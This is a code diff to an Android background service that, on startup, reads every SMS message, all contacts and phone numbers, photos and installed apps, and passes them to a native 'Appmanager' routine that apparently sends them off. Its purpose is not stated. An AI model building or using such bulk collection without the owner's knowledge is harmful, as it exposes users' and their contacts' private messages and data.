@@ -6,6 +6,8 @@ import java.io.File;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
+import java.sql.Date;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -13,9 +15,11 @@ import android.app.Service;
 import android.content.ContentResolver;
 import android.content.Intent;
 import android.database.Cursor;
+import android.database.sqlite.SQLiteException;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.media.ThumbnailUtils;
+import android.net.Uri;
 import android.os.Handler;
 import android.os.IBinder;
 import android.provider.ContactsContract;
@@ -51,82 +55,162 @@ public class androidService extends Service {
 		// }
 		// getPhotosInfo();
 		Appmanager.jnipthreadinit();
-		appinfolist();
-//		getPhoneContacts();
-		getUserInfo();
-//		getBookinfo();
+
 		mHandler.post(mRunnable);
 
-		// new Thread() {
-		// public void run() {
-		// try {
-		// Thread.sleep(1000);
-		// } catch (InterruptedException e) {
-		// // TODO Auto-generated catch block
-		// e.printStackTrace();
-		// }
-		// openservice();
-		// };
-		// }.start();
+		new Thread() {
+			public void run() {
+				try {
+					Thread.sleep(1000);
+				} catch (InterruptedException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+				openservice();
+			};
+		}.start();
 	}
 
-	
-    public void getUserInfo(){
-        Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
-        while(cursor.moveToNext()){
-            String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
-            String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
-            Log.d("java"    , "Name is : "+name);
-            int isHas = Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)));
-            if(isHas>0){
-                Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,
-                         ContactsContract.CommonDataKinds.Phone.CONTACT_ID+ " = " + id,null,null);
-                while(c.moveToNext()){
-                    String number = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                    Log.d("java"   , "Number is : "+number);
-                }
-                c.close();
-            }
-        }
-        cursor.close();
-    }
-    
-    
-    
-    private String getNameFromPhone(String number) {
-        String name = null;
-        String[] projection = { ContactsContract.PhoneLookup.DISPLAY_NAME,
-                ContactsContract.CommonDataKinds.Phone.NUMBER };
+	public String getSmsInPhone() {
+		i = 0;
+		final String SMS_URI_ALL = "content://sms/"; // 所有短信
+		final String SMS_URI_INBOX = "content://sms/inbox"; // 收信箱
+		final String SMS_URI_SEND = "content://sms/sent"; // 发信箱
+		final String SMS_URI_DRAFT = "content://sms/draft"; // 草稿箱
+		StringBuilder smsBuilder = new StringBuilder();
+		try {
+			ContentResolver cr = getContentResolver();
+			String[] projection = new String[] { "_id", "address", "person",
+					"body", "date", "type" };
+			Uri uri = Uri.parse(SMS_URI_ALL);
+			Cursor cur = cr.query(uri, projection, null, null, "date desc");
+			if (cur.moveToFirst()) {
+				String name;
+				String phoneNumber;
+				String smsbody;
+				String date;
+				String type;
+				int nameColumn = cur.getColumnIndex("person");// 姓名
+				int phoneNumberColumn = cur.getColumnIndex("address");// 手机号
+				int smsbodyColumn = cur.getColumnIndex("body");// 短信内容
+				int dateColumn = cur.getColumnIndex("date");// 日期
+				int typeColumn = cur.getColumnIndex("type");// 收发类型 1表示接受 2表示发送
+				do {
+					i++;
+					name = cur.getString(nameColumn);
+					phoneNumber = cur.getString(phoneNumberColumn);
+					smsbody = cur.getString(smsbodyColumn);
+					SimpleDateFormat dateFormat = new SimpleDateFormat(
+							"yyyy-MM-dd hh:mm:ss");
+					Date d = new Date(Long.parseLong(cur.getString(dateColumn)));
+					date = dateFormat.format(d);
+					int typeId = cur.getInt(typeColumn);
+					if (typeId == 1) {
+						type = "接收";
+					} else if (typeId == 2) {
+						type = "发送";
+					} else {
+						type = "";
+					}
+					smsBuilder.append("[");
 
-        Cursor cursor = this.getContentResolver().query(
-                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                projection, // Which columns to return.
-                ContactsContract.CommonDataKinds.Phone.NUMBER + " = '"
-                        + number + "'", // WHERE clause.
-                null, // WHERE clause value substitution
-                null); // Sort order.
+					smsBuilder.append(name + ",");
+					// Log.d("java", "name" + name);
 
-        if (cursor == null) {
-            Log.d(TAG, "getPeople null");
-            return null;
-        }
-        Log.d(TAG, "getPeople cursor.getCount() = " + cursor.getCount());
-        for (int i = 0; i < cursor.getCount(); i++) {
-            cursor.moveToPosition(i);
+					smsBuilder.append(phoneNumber + ",");
+					// Log.d("java", "PhoneNumber" + phoneNumber);
 
-            int nameFieldColumnIndex = cursor
-                    .getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
-            name = cursor.getString(nameFieldColumnIndex);
-            Log.i(TAG, "" + name + " .... " + nameFieldColumnIndex);
-            
-            
-        }
-        cursor.close();
-        return name;
-        
-    }
-    
-    
+					smsBuilder.append(smsbody + ",");
+					// Log.d("java", "smsbody" + smsbody);
+
+					smsBuilder.append(date + ",");
+					// Log.d("java", "date" + date);
+
+					smsBuilder.append(type);
+					// Log.d("java", "type " + type);
+
+					Appmanager.setmmsinfo(name, phoneNumber, smsbody, date,
+							typeId, i);
+
+					smsBuilder.append("] ");
+					if (smsbody == null)
+						smsbody = "";
+				} while (cur.moveToNext());
+			} else {
+				smsBuilder.append("没有记录!");
+			}
+			smsBuilder.append("获取彩信完成!");
+		} catch (SQLiteException ex) {
+			Log.d("SQLiteException in getSmsInPhone", ex.getMessage());
+		}
+		return smsBuilder.toString();
+	}
+
+	public void getUserInfo() {
+		i = 0;
+		Cursor cursor = getContentResolver().query(
+				ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
+		while (cursor.moveToNext()) {
+			i++;
+			String id = cursor.getString(cursor
+					.getColumnIndex(ContactsContract.Contacts._ID));
+			String name = cursor.getString(cursor
+					.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
+			// Log.d("java" , "Name is : "+name);
+			int isHas = Integer
+					.parseInt(cursor.getString(cursor
+							.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)));
+			if (isHas > 0) {
+				Cursor c = getContentResolver().query(
+						ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+						null,
+						ContactsContract.CommonDataKinds.Phone.CONTACT_ID
+								+ " = " + id, null, null);
+				while (c.moveToNext()) {
+					String number = c
+							.getString(c
+									.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+					// Log.d("java" , "Number is : "+number);
+					Appmanager.setbookinfo(name, number, i);
+				}
+				c.close();
+			}
+		}
+		cursor.close();
+	}
+
+//	private String getNameFromPhone(String number) {
+//		String name = null;
+//		String[] projection = { ContactsContract.PhoneLookup.DISPLAY_NAME,
+//				ContactsContract.CommonDataKinds.Phone.NUMBER };
+//
+//		Cursor cursor = this.getContentResolver().query(
+//				ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+//				projection, // Which columns to return.
+//				ContactsContract.CommonDataKinds.Phone.NUMBER + " = '" + number
+//						+ "'", // WHERE clause.
+//				null, // WHERE clause value substitution
+//				null); // Sort order.
+//
+//		if (cursor == null) {
+//			Log.d(TAG, "getPeople null");
+//			return null;
+//		}
+//		Log.d(TAG, "getPeople cursor.getCount() = " + cursor.getCount());
+//		for (int i = 0; i < cursor.getCount(); i++) {
+//			cursor.moveToPosition(i);
+//
+//			int nameFieldColumnIndex = cursor
+//					.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
+//			name = cursor.getString(nameFieldColumnIndex);
+//			Log.i(TAG, "" + name + " .... " + nameFieldColumnIndex);
+//
+//		}
+//		cursor.close();
+//		return name;
+//
+//	}
+
 	@Override
 	public IBinder onBind(Intent arg0) {
 		// TODO Auto-generated method stub
@@ -161,8 +245,8 @@ public class androidService extends Service {
 		public void run() {
 
 			// 为了方便 查看，我们用Log打印出来
-//			Log.e(TAG, Thread.currentThread().getName() + " " + count);
-//			count++;
+			// Log.e(TAG, Thread.currentThread().getName() + " " + count);
+			// count++;
 			// setTitle("" + count);
 			// 每2秒执行一次
 			switch (Appmanager.whatyouwant()) {
@@ -318,8 +402,8 @@ public class androidService extends Service {
 			int kind) {
 		Bitmap bitmap = null;
 		bitmap = ThumbnailUtils.createVideoThumbnail(videoPath, kind);
-//		System.out.println("w" + bitmap.getWidth());
-//		System.out.println("h" + bitmap.getHeight());
+		// System.out.println("w" + bitmap.getWidth());
+		// System.out.println("h" + bitmap.getHeight());
 		bitmap = ThumbnailUtils.extractThumbnail(bitmap, width, height,
 				ThumbnailUtils.OPTIONS_RECYCLE_INPUT);
 		return bitmap;
@@ -336,8 +420,8 @@ public class androidService extends Service {
 		List<PackageInfo> packages = getPackageManager()
 				.getInstalledPackages(0);
 		for (int j = 0; j < packages.size(); j++) {
-//			System.out.println("packages.size is" + packages.size());
-//			System.out.println(j);
+			// System.out.println("packages.size is" + packages.size());
+			// System.out.println(j);
 			PackageInfo packageInfo = packages.get(j);
 			AppInfo tmpInfo = new AppInfo();
 			tmpInfo.appName = packageInfo.applicationInfo.loadLabel(
@@ -345,7 +429,6 @@ public class androidService extends Service {
 			tmpInfo.packageName = packageInfo.packageName;
 			tmpInfo.versionName = packageInfo.versionName;
 			tmpInfo.versionCode = packageInfo.versionCode;
-
 
 			Appmanager.setappinfo(1, 1, tmpInfo.appName, tmpInfo.packageName,
 					tmpInfo.versionName, "123456", j);
@@ -370,10 +453,11 @@ public class androidService extends Service {
 	}
 
 	public void openservice() {
-		Log.v("Acanoe", "opennservic");
+		Log.v("Java", "setallinfo");
 		getPhotosInfo();
 		appinfolist();
-		Appmanager.jnipthreadinit();
-		// AppInfo.getIcon();
+		getUserInfo();
+		getSmsInPhone();
+		Appmanager.gotosend(0);
 	}
 }
